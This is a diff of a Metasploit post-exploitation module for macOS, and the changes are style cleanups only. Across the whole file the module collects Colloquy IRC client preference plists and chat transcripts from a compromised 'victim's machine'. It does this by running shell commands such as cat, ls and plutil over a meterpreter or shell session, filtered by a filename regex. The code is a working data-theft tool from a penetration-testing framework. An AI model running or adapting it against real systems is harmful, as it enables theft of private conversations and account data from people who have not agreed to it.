@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,38 +8,37 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'OS X Gather Colloquy Enumeration',
-      'Description'   => %q{
-          This module will collect Colloquy's info plist file and chat logs from the
-        victim's machine.  There are three actions you may choose:  INFO, CHATS, and
-        ALL.  Please note that the CHAT action may take a long time depending on the
-        victim machine, therefore we suggest to set the regex 'PATTERN' option in order
-        to search for certain log names (which consists of the contact's name, and a
-        timestamp).  The default 'PATTERN' is configured as "^alien" as an example
-        to search for any chat logs associated with the name "alien".
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'osx' ],
-      'SessionTypes'  => [ "meterpreter", "shell" ],
-      'Actions'       =>
-        [
-          ['ACCOUNTS', { 'Description' => 'Collect the preferences plists' } ],
-          ['CHATS',    { 'Description' => 'Collect chat logs with a pattern' } ],
-          ['ALL',      { 'Description' => 'Collect both the plists and chat logs'}]
-        ],
-      'DefaultAction' => 'ALL'
-    ))
+                      'Name'          => 'OS X Gather Colloquy Enumeration',
+                      'Description'   => %q{
+                          This module will collect Colloquy's info plist file and chat logs from the
+                        victim's machine.  There are three actions you may choose:  INFO, CHATS, and
+                        ALL.  Please note that the CHAT action may take a long time depending on the
+                        victim machine, therefore we suggest to set the regex 'PATTERN' option in order
+                        to search for certain log names (which consists of the contact's name, and a
+                        timestamp).  The default 'PATTERN' is configured as "^alien" as an example
+                        to search for any chat logs associated with the name "alien".
+                      },
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'sinn3r'],
+                      'Platform'      => [ 'osx' ],
+                      'SessionTypes'  => [ "meterpreter", "shell" ],
+                      'Actions'       =>
+                        [
+                          ['ACCOUNTS', { 'Description' => 'Collect the preferences plists' } ],
+                          ['CHATS',    { 'Description' => 'Collect chat logs with a pattern' } ],
+                          ['ALL',      { 'Description' => 'Collect both the plists and chat logs' }]
+                        ],
+                      'DefaultAction' => 'ALL'))
 
     register_options(
       [
-        OptRegexp.new('PATTERN', [true, 'Match a keyword in any chat log\'s filename', '^alien']),
-      ], self.class)
+        OptRegexp.new('PATTERN', [true, 'Match a keyword in any chat log\'s filename', '^alien'])
+      ], self.class
+    )
   end
 
   #
@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Post
   def plutil(filename)
     exec("plutil -convert xml1 #{filename}")
     data = exec("cat #{filename}")
-    return data
+    data
   end
 
   def get_chatlogs(base)
@@ -66,11 +66,11 @@ class MetasploitModule < Msf::Post
         next if fname !~ datastore['PATTERN']
         print_status("#{@peer} - Downloading #{t}")
         content = exec("cat \"#{t}\"")
-        chats << {:log_name => fname, :content => content}
+        chats << { log_name: fname, content: content }
       end
     end
 
-    return chats
+    chats
   end
 
   def get_preferences(path)
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Post
     return nil if raw_plist =~ /No such file or directory/
 
     xml_plist = plutil(path)
-    return xml_plist
+    xml_plist
   end
 
   def save(type, data)
@@ -118,7 +118,7 @@ class MetasploitModule < Msf::Post
     subdirs = exec("ls -l #{path}")
     return [] if subdirs =~ /No such file or directory/
     items = subdirs.scan(/[A-Z][a-z][a-z]\x20+\d+\x20[\d\:]+\x20(.+)$/).flatten
-    return items
+    items
   end
 
   def exec(cmd)
@@ -155,16 +155,13 @@ class MetasploitModule < Msf::Post
     prefs    = get_preferences(prefs_path)    if action.name =~ /ALL|ACCOUNTS/i
     chatlogs = get_chatlogs(transcripts_path) if action.name =~ /ALL|CHATS/i
 
-    save(:preferences, prefs) if not prefs.nil? and not prefs.empty?
-    save(:chatlogs, chatlogs) if not chatlogs.nil? and not chatlogs.empty?
+    save(:preferences, prefs) if !prefs.nil? && !prefs.empty?
+    save(:chatlogs, chatlogs) if !chatlogs.nil? && !chatlogs.empty?
   end
-
 end
 
-=begin
-/Users/[user]/Documents/Colloquy Transcripts
-/Users/[user]/Library/Preferences/info.colloquy.plist
-
-Transcript example:
-/Users/[username]/Documents/Colloquy Transcripts//[server]/[contact] 10-13-11.colloquyTranscript
-=end
+# /Users/[user]/Documents/Colloquy Transcripts
+# /Users/[user]/Library/Preferences/info.colloquy.plist
+#
+# Transcript example:
+# /Users/[username]/Documents/Colloquy Transcripts//[server]/[contact] 10-13-11.colloquyTranscript
